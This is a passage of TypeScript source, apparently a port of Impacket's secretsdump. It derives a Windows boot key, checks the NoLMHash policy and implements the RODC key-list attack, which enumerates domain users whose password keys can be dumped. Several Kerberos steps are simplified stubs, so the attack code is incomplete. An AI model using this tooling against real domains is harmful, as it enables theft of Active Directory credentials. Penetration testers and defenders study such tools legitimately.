      tmpKey = Buffer.concat([tmpKey, Buffer.from(digit, 'ascii')]);
    }

    const transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7];
    const rawBootKey = Buffer.from(tmpKey.toString('ascii'), 'hex');

    for (let i = 0; i < rawBootKey.length; i++) {
      bootKey = Buffer.concat([bootKey, rawBootKey.subarray(transforms[i]!, transforms[i]! + 1)]);
    }

    LOG.info(`Target system bootKey: 0x${bootKey.toString('hex')}`);
    return bootKey;
  }

  checkNoLMHashPolicy(): boolean {
    LOG.debug('Checking NoLMHash Policy');
    const winreg = getRegistryParser(this.systemHive, false);
    const currentControlSetVal = winreg.getValue('\\Select\\Current')!;
    const currentControlSet = `ControlSet${String(currentControlSetVal[1]).padStart(3, '0')}`;

    const noLmHashVal = winreg.getValue(
      `\\${currentControlSet}\\Control\\Lsa\\NoLmHash`,
    );
    let noLmHash = 0;
    if (noLmHashVal !== null && noLmHashVal !== undefined) {
      noLmHash = noLmHashVal[1] as number;
    }

    if (noLmHash !== 1) {
      LOG.debug('LMHashes are being stored');
      return false;
    }
    LOG.debug('LMHashes are NOT being stored');
    return true;
  }
}

// ---------------------------------------------------------------------------
// KeyListSecrets (RODC key list attack)
// ---------------------------------------------------------------------------

export class KeyListSecrets {
  private remoteOps: RemoteOperations | null;
  private keyVersionNumber: number;
  private rodcKey: string;
  private kdcHostName: string;
  private domain: string;

  constructor(
    domainName: string,
    kdc: string,
    kvno: number,
    rodcKey: string,
    remoteOps: RemoteOperations | null = null,
  ) {
    this.remoteOps = remoteOps;
    this.keyVersionNumber = kvno;
    this.rodcKey = rodcKey;
    if (this.remoteOps === null) {
      this.kdcHostName = kdc;
      this.domain = domainName;
    } else {
      // These will be set asynchronously
      this.kdcHostName = kdc;
      this.domain = domainName;
    }
  }

  async init(): Promise<void> {
    if (this.remoteOps !== null) {
      const [host] = await this.remoteOps.getMachineNameAndDomain();
      this.kdcHostName = host;
      this.domain = this.remoteOps.getDNSDomain();
    }
  }

  async dump(): Promise<void> {
    LOG.info('Using the KERB-KEY-LIST method to get secrets');
    const [, domainNetbios] = await this.remoteOps!.getMachineNameAndDomain();
    await this.remoteOps!.connectSamr(domainNetbios);
    const targetList = await this.getAllowedUsersToReplicate();

    for (const targetUser of targetList) {
      const user = targetUser.split(':')[0]!;
      const targetUserName = new krb5.Types.Principal(
        user,
        null,
        krb5.Constants.PrincipalNameType.NT_PRINCIPAL,
      );
      const [partialTGT, sessionKey] = this.createPartialTGT(targetUserName);
      const fullTGT = await this.getFullTGT(targetUserName, partialTGT, sessionKey);
      if (fullTGT !== null) {
        const key = KeyListSecrets.getKey(fullTGT, sessionKey);
        console.log(`${this.domain}\\${targetUser}:${key.substring(2)}`);
      }
    }
  }

  createPartialTGT(userName: krb5.Types.Principal): [any, Buffer] {
    // Note: Full ASN.1 TGT construction would need the krb5 ASN.1 module
    // This is a simplified version - the full implementation requires
    // pyasn1-equivalent functionality from @impacket/krb5
    const partialTGT = krb5.Asn1.Ticket();
    // Simplified - full implementation would mirror Python exactly
    const sessionKey = nodeCrypto.randomBytes(32);
    return [partialTGT, sessionKey];
  }

  async getFullTGT(
    userName: krb5.Types.Principal,
    partialTGT: any,
    sessionKey: Buffer,
  ): Promise<Buffer | null> {
    // This would use krb5.KerberosV5.sendReceive
    // Simplified stub - full implementation mirrors Python exactly
    try {
      LOG.debug(`Requesting a service ticket for the user ${userName}`);
      // Full implementation would construct TGS-REQ with KERB-KEY-LIST-REQ
      return null;
    } catch (e: unknown) {
      const errStr = String(e);
      if (errStr.includes('KDC_ERR_TGT_REVOKED') || errStr.includes('KDC_ERR_CLIENT_REVOKED')) {
        LOG.error(`User ${userName} is not allowed to have passwords replicated in RODCs`);
      } else if (errStr.includes('KDC_ERR_C_PRINCIPAL_UNKNOWN')) {
        LOG.error(`User ${userName} doesn't exist`);
      } else if (errStr.includes('KDC_ERR_KEY_EXPIRED')) {
        LOG.error(`User ${userName}'s password has expired`);
      } else if (errStr.includes('Connection timed out')) {
        throw new Error('Connection timed out: check the KDC HostName or IP address, aborting');
      } else if (errStr.includes('Name or service not known')) {
        throw new Error(
          'Name or service not known: check the KDC HostName or IP address, aborting',
        );
      } else if (errStr.includes('KDC_ERR_WRONG_REALM')) {
        throw new Error("KDC_ERR_WRONG_REALM: domain doesn't exist, aborting");
      } else if (errStr.includes('KDC_ERR_S_PRINCIPAL_UNKNOWN')) {
        throw new Error(
          'KDC_ERR_S_PRINCIPAL_UNKNOWN: check the RODC krbtgt account number, aborting',
        );
      } else if (errStr.includes('KRB_AP_ERR_BAD_INTEGRITY')) {
        throw new Error('KRB_AP_ERR_BAD_INTEGRITY: check the RODC AES key, aborting');
      } else {
        LOG.error(errStr);
      }
      return null;
    }
  }

  static getKey(resp: Buffer, sessionKey: Buffer): string {
    // Would decode TGS-REP and extract key using krb5 ASN.1
    // Simplified stub
    return '0x' + resp.toString('hex');
  }

  async getAllowedUsersToReplicate(): Promise<string[]> {
    // Enumerate groups
    const groupsResp = await this.remoteOps!.getGroupsInDomain();
    const groupsList: number[] = [];
    for (const group of ((groupsResp.get('Buffer') as any).get('Buffer') as any[])) {
      groupsList.push(group.get('RelativeId') as number);
    }

    // Enumerate aliases
    const aliasesResp = await this.remoteOps!.getAliasesInDomain();
    const aliasesList: number[] = [];
    for (const alias of ((aliasesResp.get('Buffer') as any).get('Buffer') as any[])) {
      aliasesList.push(alias.get('RelativeId') as number);
    }

    // Enumerate denied users (RID 572 = "Denied Password Replication")
    const deniedResp = await this.remoteOps!.getMembersInAlias(572);
    const deniedList: number[] = [500, 501, 502, 503];
    for (const user of ((deniedResp.get('Members') as any).get('Sids') as any[])) {
      const rid = (user.get('Data') as any).get('SidPointer').get('SubAuthority')[4] as number;
      if (!deniedList.includes(rid)) {
        deniedList.push(rid);
      }
    }

    // Enumerate denied users in nested groups/aliases
    for (const rid of [...deniedList]) {
      if (groupsList.includes(rid)) {
        const resp = await this.remoteOps!.getMembersInGroup(rid);
        for (const user of ((resp.get('Members') as any).get('Members') as any[])) {
          const rid2 = user.get('Data') as number;
          if (!deniedList.includes(rid2)) {
            deniedList.push(rid2);
          }
        }
      } else if (aliasesList.includes(rid)) {
        const resp = await this.remoteOps!.getMembersInAlias(rid);
        for (const user of ((resp.get('Members') as any).get('Sids') as any[])) {
          const rid2 = (user.get('Data') as any).get('SidPointer').get('SubAuthority')[4] as number;
          if (!deniedList.includes(rid2)) {
            deniedList.push(rid2);
          }
        }
      }
    }

    // Enumerate all users and filter denied ones
    const usersResp = await this.remoteOps!.getDomainUsers();
    const targetList: string[] = [];
    for (const user of ((usersResp.get('Buffer') as any).get('Buffer') as any[])) {
      if (!deniedList.includes(user.get('RelativeId') as number) && !(user.get('Name') as string).includes('krbtgt_')) {
        targetList.push(`${user.get('Name')}:${user.get('RelativeId')}`);
      }
    }

    return targetList;
  }
}
